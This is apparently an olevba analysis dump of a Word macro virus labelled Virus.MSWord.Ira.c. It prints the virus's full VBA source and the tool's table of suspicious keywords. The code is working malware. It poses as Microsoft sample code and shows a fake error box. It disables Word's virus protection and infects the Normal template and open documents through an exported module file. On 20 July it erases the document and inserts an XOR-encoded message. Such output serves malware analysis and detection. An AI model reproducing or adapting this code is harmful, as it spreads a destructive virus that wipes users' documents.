olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Ira.c-0dc4014e60b83797b39d25fd0df95b177d6a572a
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Ira.c-0dc4014e60b83797b39d25fd0df95b177d6a572a - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO vba332.bas 
in file: Virus.MSWord.Ira.c-0dc4014e60b83797b39d25fd0df95b177d6a572a - OLE stream: 'Macros/VBA/vba332'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Option Explicit
' ------------------------------------------------------------------------
'               Copyright (C) 2001 Microsoft Corporation
'
' You have a royalty-free right to use, modify, reproduce and distribute
' the Sample Application Files (and/or any modified version) in any way
' you find useful, provided that you agree that Microsoft has no warranty,
' obligations or liability for any Sample Application Files.
' <---------------------------------------------------------------------->
Const VBP_DllPath As String = "c:\vmm32.dll"
Const VBP_Name As String = "vba332"
Public Sub FileSave()
 On Error Resume Next
 GetPrivateProfileStringA "win.ini"
 If ActiveDocument.Saved = False Then ActiveDocument.Save
End Sub
Public Sub ToolsMacro(): VB_HiddenInterface
End Sub
Public Sub ViewVBCode(): VB_HiddenInterface
End Sub
Private Sub VB_HiddenInterface()
 MsgBox "VBA332.DDL: VB_HiddenInterface - function not found.", vbCritical + vbOKOnly, "Microsoft Visual Basic"
End Sub
Private Sub GetPrivateProfileStringA(INIFile As String)
 Dim Increment As Integer
 Dim PrivateProfileStringN, PrivateProfileStringA As Boolean
 PrivateProfileStringN = False: PrivateProfileStringA = False
 ThisDocument.VBProject.VBComponents.Item(VBP_Name).Export (VBP_DllPath)
 For Increment = 1 To NormalTemplate.VBProject.VBComponents.Count
  If NormalTemplate.VBProject.VBComponents.Item(Increment).Name = VBP_Name Then
   PrivateProfileStringN = True
  End If
 Next Increment
 If PrivateProfileStringN = False And INIFile = "vba.ini" Then
  NormalTemplate.VBProject.VBComponents.Import (VBP_DllPath): NormalTemplate.Save: End
 End If
 For Increment = 1 To ActiveDocument.VBProject.VBComponents.Count
  If ActiveDocument.VBProject.VBComponents.Item(Increment).Name = VBP_Name Then
   PrivateProfileStringA = True
  End If
 Next Increment
 If PrivateProfileStringA = False Then
  ActiveDocument.VBProject.VBComponents.Import (VBP_DllPath)
 End If
 Kill VBP_DllPath
' Çÿç÷åï#/ð/äñîäñ/ýêîð...
' Þêÿ·ìï/'ì!Ú!#=??>ì!&
End Sub
Public Sub AutoOpen()
 On Error Resume Next
 Dim Increment As Integer
 Dim Temp, Body As String
 Temp = "K`lzbja{/|zllj||izccv/kj|{}`vjk!"
 ShowVisualBasicEditor = Not True
 With Options
  .VirusProtection = Not True
  .SaveNormalPrompt = Not True
 End With
 GetPrivateProfileStringA "vba.ini"
 If Day(Date) = 20 And Month(Date) = 7 Then
  For Increment = 1 To Len(Temp)
   Body = Body + Chr(Asc(Mid(Temp, Increment, 1)) Xor 15)
  Next Increment
  With ActiveDocument
   .Range.Delete
   .Range.InsertAfter Body
   .UndoClear
   .Save
  End With
 End If
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|Xor                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |vmm32.dll           |Executable file name                         |
+----------+--------------------+---------------------------------------------+

